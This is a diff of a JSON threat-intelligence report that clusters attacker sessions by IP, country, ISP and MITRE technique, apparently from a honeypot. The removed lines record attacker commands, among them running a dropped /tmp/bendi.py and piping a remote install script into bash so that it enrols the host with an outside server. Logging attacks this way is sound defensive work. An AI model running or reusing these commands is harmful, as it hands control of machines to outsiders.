@@ -1,9 +1,9 @@
 {
-  "generated_at": "2026-06-14T17:23:38.581417+00:00",
-  "total_sessions_with_commands": 6,
+  "generated_at": "2026-06-14T19:42:10.464046+00:00",
+  "total_sessions_with_commands": 1,
   "total_clusters": 1,
   "campaign_clusters": 0,
-  "singleton_clusters": 0,
+  "singleton_clusters": 1,
   "highest_severity": "NONE",
   "active_campaigns": [],
   "clusters": [
@@ -14,77 +14,29 @@
       "campaign_severity": null,
       "campaign_description": null,
       "matched_campaigns": [],
-      "session_count": 6,
+      "session_count": 1,
       "unique_ips": [
-        "168.156.171.11",
-        "138.2.98.41",
-        "40.233.83.131"
+        "111.228.16.135"
       ],
-      "unique_ip_count": 3,
-      "sequence_hash": "d2af147dd3fa2817",
+      "unique_ip_count": 1,
+      "sequence_hash": "6fa4c8ac58e7a1d9",
       "ttps": [
         {
-          "id": "T1105",
-          "name": "Ingress Tool Transfer"
+          "id": "T1082",
+          "name": "System Information Discovery"
         }
       ],
       "representative_commands": [
-        "command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3",
-        "apt-get update -y",
-        "apt-get install -y python3",
-        "python3 /tmp/bendi.py",
-        "rm /tmp/bendi.py",
-        "if ! command -v curl &> /dev/null; then apt-get update -y && apt-get install -y curl || yum install -y curl; fi",
-        "bash <(curl -sL https://raw.githubusercontent.com/komari-monitor/komari-agent/refs/heads/main/install.sh) -e https://sexy.pp.ua --auto-discovery DsR94pYWmSUpC3n43RmwPxKw"
+        "uname -s -m"
       ],
       "members": [
         {
-          "session_id": "IR-67f97a549cea",
-          "src_ip": "40.233.83.131",
-          "country": "CA",
-          "isp": "Oracle Corporation",
-          "command_count": 7,
-          "timestamp": "2026-06-14T15:17:03.725744Z"
-        },
-        {
-          "session_id": "IR-868586fc19a1",
-          "src_ip": "40.233.83.131",
-          "country": "CA",
-          "isp": "Oracle Corporation",
-          "command_count": 7,
-          "timestamp": "2026-06-14T15:19:23.776105Z"
-        },
-        {
-          "session_id": "IR-0b61f2f2d23a",
-          "src_ip": "138.2.98.41",
-          "country": "SG",
-          "isp": "Oracle Corporation",
-          "command_count": 7,
-          "timestamp": "2026-06-14T15:57:10.143917Z"
-        },
-        {
-          "session_id": "IR-2b4ff35ecb7e",
-          "src_ip": "138.2.98.41",
-          "country": "SG",
-          "isp": "Oracle Corporation",
-          "command_count": 7,
-          "timestamp": "2026-06-14T15:59:38.474653Z"
-        },
-        {
-          "session_id": "IR-4b7763d96ebf",
-          "src_ip": "168.156.171.11",
-          "country": "US",
-          "isp": "Washington State Board for Community & Technical Colleges",
-          "command_count": 7,
-          "timestamp": "2026-06-14T16:47:13.574818Z"
-        },
-        {
-          "session_id": "IR-6e3f6ac08fb1",
-          "src_ip": "168.156.171.11",
-          "country": "US",
-          "isp": "Washington State Board for Community & Technical Colleges",
-          "command_count": 7,
-          "timestamp": "2026-06-14T16:49:34.999734Z"
+          "session_id": "IR-9e460048ad04",
+          "src_ip": "111.228.16.135",
+          "country": "CN",
+          "isp": "eleven street,No. 18 Institute of Jingdong headquarters",
+          "command_count": 1,
+          "timestamp": "2026-06-14T17:02:19.167743Z"
         }
       ]
     }
